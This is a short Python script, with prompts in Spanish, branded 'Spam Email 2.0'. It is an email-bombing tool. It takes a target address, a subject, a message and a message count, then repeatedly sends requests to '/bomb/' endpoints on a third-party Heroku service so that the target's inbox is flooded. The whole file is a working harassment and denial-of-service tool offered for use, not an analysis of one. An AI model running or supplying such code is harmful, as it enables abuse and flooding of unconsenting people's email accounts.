import requests 
import random
import os 
import time
# os.system("bash wake.sh &")
time.sleep(2)
os.system("clear")
print("\n")
print("**************************")
print("*     Spam Email 2.0     *")
print("* ╚» Sʜᴀᴅᴏᴡ Cᴀᴘᴛᴀɪɴ ☬ «╝ *")
print("**************************")
to=str(input("Ingrese el correo electronico:"))
sub=str(input("Ingresar asunto:"))
msg=str(input("Ingresar mensaje:"))
msg=msg.replace(" ","%20")
sub=sub.replace(" ","%20")
srvrlist={1:"https://memenuker.herokuapp.com/1",2:"https://memenuker.herokuapp.com/2",3:"https://memenuker.herokuapp.com/18",4:"https://memenuker.herokuapp.com/4",5:"https://memenuker.herokuapp.com/5",6:"https://memenuker.herokuapp.com/6",7:"https://memenuker.herokuapp.com/7",8:"https://memenuker.herokuapp.com/8",9:"https://memenuker.herokuapp.com/9",10:"https://memenuker.herokuapp.com/10",11:"https://memenuker.herokuapp.com/11",12:"https://memenuker.herokuapp.com/1",13:"https://memenuker.herokuapp.com/13",14:"https://memenuker.herokuapp.com/14",15:"https://memenuker.herokuapp.com/15",16:"https://memenuker.herokuapp.com/16",17:"https://memenuker.herokuapp.com/17",18:"https://memenuker.herokuapp.com/18",19:"https://memenuker.herokuapp.com/1",20:"https://memenuker.herokuapp.com/2",21:"https://memenuker.herokuapp.com/2"}
am=int(input("Ingrese la cantidad de mensajes a enviar:"))
if "/" in msg: 
    print("Caracteres inválidos en el mensaje")
else: 
    for i in range(0,am): 
        srvr=random.randint(1,21)
        req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
        if req.text=="Sent": 
            print("           ")
            print (str(i+1)+" msgs sent")
        else:
            print ("No se pudo enviar el mensaje")
            print("Por favor informe este error al desarrollador")
            print("La respuesta guardada del servidor fue:"+str(srvr)+req.text)
            break